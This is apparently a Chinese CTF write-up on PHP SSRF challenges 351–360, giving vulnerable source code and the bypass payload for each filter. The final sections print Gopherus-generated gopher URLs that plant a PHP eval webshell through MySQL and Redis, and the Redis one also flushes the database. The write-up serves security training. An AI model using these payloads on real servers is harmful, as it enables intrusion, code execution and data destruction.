[toc]

# PHP SSRF基础

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

**相关函数和类**

- file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中
- readfile()：输出一个文件的内容
- fsockopen()：打开一个网络连接或者一个Unix 套接字连接
- curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用
- fopen()：打开一个文件文件或者 URL
- PHP原生类SoapClient在触发反序列化时可导致SSRF

**相关协议**

- file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容
- dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等
- gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell
- http/s协议：探测内网主机存活

**利用方式**

> 1.让服务端去访问相应的网址
>
> 2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms
>
> 3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
>
> 4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）
>
> 5.攻击内网应用程序（利用跨协议通信技术）
>
> 6.判断内网主机是否存活：方法是访问看是否有端口开放
>
> 7.DoS攻击（请求大文件，始终保持连接keep-alive always）

# 351 无过滤

源码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
// 初始化
$ch=curl_init($url);
// 参数设置
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// 执行
$result=curl_exec($ch);
// 关闭
curl_close($ch);
echo ($result);
?>
# curl_init — 初始化 cURL 会话    
# curl_setopt — 设置一个cURL传输选项
# curl_exec — 执行 cURL 会话
# curl_close — 关闭 cURL 会话
```

payload

```
url=http://127.0.0.1/flag.php
```

# 352 过滤127.0.0

源代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_POST['url'];
$x = parse_url($url);
if ($x['scheme'] === 'http' || $x['scheme'] === 'https') {
    if (!preg_match('/localhost|127.0.0/')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        echo($result);
    } else {
        die('hacker');
    }
} else {
    die('hacker');
}
```

payload

```
url=http://127.0.0.1/flag.php
```

# 353   过滤127.0

源码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_POST['url'];
$x = parse_url($url);
if ($x['scheme'] === 'http' || $x['scheme'] === 'https') {
    if (!preg_match('/localhost|127\.0\.|\。/i', $url)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        echo($result);
    } else {
        die('hacker');
    }
} else {
    die('hacker');
}
?> 
```

payload

```
127.0.0.1
十进制整数：url=http://2130706433/flag.php
十六进制：url=http://0x7F.0.0.1/flag.php
八进制：url=http://0177.0.0.1/flag.php
十六进制整数：url=http://0x7F000001/flag.php
```

# 354 357 过滤 1 0

源代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_POST['url'];
$x = parse_url($url);
if ($x['scheme'] === 'http' || $x['scheme'] === 'https') {
    if (!preg_match('/localhost|1|0|。/i', $url)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        echo($result);
    } else {
        die('hacker');
    }
} else {
    die('hacker');
}
?>
```

payload

```
域名指向127.0.0.1
把自己的域名指向127.0.0.1
url=http://r.szfsfu.ceye.io/flag.php
```

# 355 过滤http https 限制长度

源代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_POST['url'];
$x = parse_url($url);
if ($x['scheme'] === 'http' || $x['scheme'] === 'https') {
    $host = $x['host'];
    if ((strlen($host) <= 5)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        echo($result);
    } else {
        die('hacker');
    }
} else {
    die('hacker');
}
?> 
```

先来了解下 parse_url 函数

```php
解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分
数组中可能的键有以下几种：
scheme - 如 http
host
port
user
pass
path
query - 在问号 ? 之后
fragment - 在散列符号 # 之后
    
# 例：
<?php
$url = 'http://username:password@hostname/path?arg=value#anchor';
print_r(parse_url($url));
echo parse_url($url, PHP_URL_PATH);
?>    
# 输出
Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)
/path

```

payload

```
url=http://127.1/flag.php
127.1整好五位
```

# 356 三位长度host

源代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_POST['url'];
$x = parse_url($url);
if ($x['scheme'] === 'http' || $x['scheme'] === 'https') {
    $host = $x['host'];
    if ((strlen($host) <= 3)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        echo($result);
    } else {
        die('hacker');
    }
} else {
    die('hacker');
}
?> hacker
```

payload

```
url=http://0/flag.php
# 0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0
```

# 358 正则匹配

源代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_POST['url'];
$x = parse_url($url);
if (preg_match('/^http:\/\/ctf\..*show$/i', $url)) {
    echo file_get_contents($url);
}
```

payload

```
payload:
url=http://ctf.@127.0.0.1/flag.php#show
```

# 359 SSRF工具gopherus gopher 协议去打 mysql 

使用 gopher 协议去打 mysql

用 gopherus 工具生成 payload

```
python2 .\gopherus.py --exploit mysql

username:root
写入一句话木马
select "<?php @eval($_POST['cmd']);?>" into outfile '/var/www/html/2.php';
```

生成payload

```bash
➜  Gopherus git:(master) python gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: root
Give query to execute: select "<?php @eval($_POST['cmd']);?>" into outfile '/var/www/html/2.php';

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4b%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01
```

_下划线后面的字符串要url编码一次

# 360 SSRF工具gopherus 打0.0.0.0:6379的redis

> **什么是Redis未授权访问？**
>
> Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器
>
> 简单说，漏洞的产生条件有以下两点：
>
> - redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网
> - 没有设置密码认证（一般为空），可以免密码远程登录redis服务

使用 gopher 协议去打 redis

用 gopherus 工具生成 payload

```
➜  Gopherus git:(master) python  gopherus.py --exploit redis


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$


Ready To get SHELL

What do you want?? (ReverseShell/PHPShell): phpshell

Give web root location of server (default is /var/www/html):
Give PHP Payload (We have default PHP Shell): <?php @eval($_POST['cmd']);?>

Your gopher link is Ready to get PHP Shell:

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

When it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.
```

_下划线后面的字符串要url编码一次